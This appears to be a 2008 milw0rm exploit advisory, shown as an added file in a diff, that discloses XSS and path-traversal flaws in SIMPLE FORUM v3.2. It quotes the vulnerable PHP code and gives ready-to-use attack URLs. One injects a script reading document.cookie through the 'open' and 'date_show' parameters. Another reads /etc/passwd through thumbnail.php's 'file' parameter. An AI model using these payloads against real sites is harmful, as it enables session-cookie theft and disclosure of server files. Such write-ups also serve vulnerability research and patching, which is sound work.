@@ -1,0 +1,78 @@
+           ########################################################
+           #                                                      #
+           # SIMPLE FORUM v 3.2 MULTIPLE VULNERABILITIES          #
+           # author      : tomplixsee                             #  
+           # my email    : tomplixsee@yahoo.co.id                 #
+           #                                                      #	       
+           # software    : SIMPLE FORUM v3.2                      #
+           # download    : http://www.gerd-tentler.de/tools/forum/#
+           #                                                      #
+           ########################################################
+
+
+1.XSS 
+  vulnerable code on forum.php
+  
+  <?
+  .....
+  if(isset($_REQUEST['date_show'])) $date_show = $_REQUEST['date_show'];
+  .....
+  if(isset($_REQUEST['open'])) $open = $_REQUEST['open'];
+  .....
+  <input type="hidden" name="date_show" value="<? echo $date_show; ?>">
+  <input type="hidden" name="open" value="<? echo $open; ?>">
+  .....
+example:
+  http://target/path/forum.php?open="/><script>alert(document.cookie)</script>
+  http://target/path/forum.php?date_show="/><script>alert(document.cookie)</script>
+
+
+2.Remote File Disclosure
+  vulnerable code on thumbnail.php
+  
+  <?
+  ....
+  if(isset($_REQUEST['file'])) $file = $_REQUEST['file'];
+  if(isset($_REQUEST['type'])) $type = $_REQUEST['type'];
+  ....
+  switch($type) {
+      case 1:
+        if($img && function_exists('ImageGIF')) {
+          header('Content-type: image/gif');
+          @ImageGIF($img);
+        }
+        else if($img && function_exists('ImagePNG')) {
+          header('Content-type: image/png');
+          @ImagePNG($img);
+        }
+        else {
+          header('Content-type: image/gif');
+          readfile($file);
+        }
+      break;
+
+      case 2:
+        header('Content-type: image/jpeg');
+        if($img && function_exists('ImageJPEG')) @ImageJPEG($img);
+        else readfile($file);
+      break;
+
+      case 3:
+        header('Content-type: image/png');
+        if($img && function_exists('ImagePNG')) @ImagePNG($img);
+        else readfile($file);
+      break;
+              }
+  ....
+  ?>
+
+example:
+ http://target/path/thumbnail.php?type=3&file=../../../../../../../etc/passwd
+ then try to view the page source :D
+
+
+
+salam tuk:
+ira, sukabirus network community, akillers 179,bidulux,sibalbal,crutz_ao,  
+
+# milw0rm.com [2008-01-26]
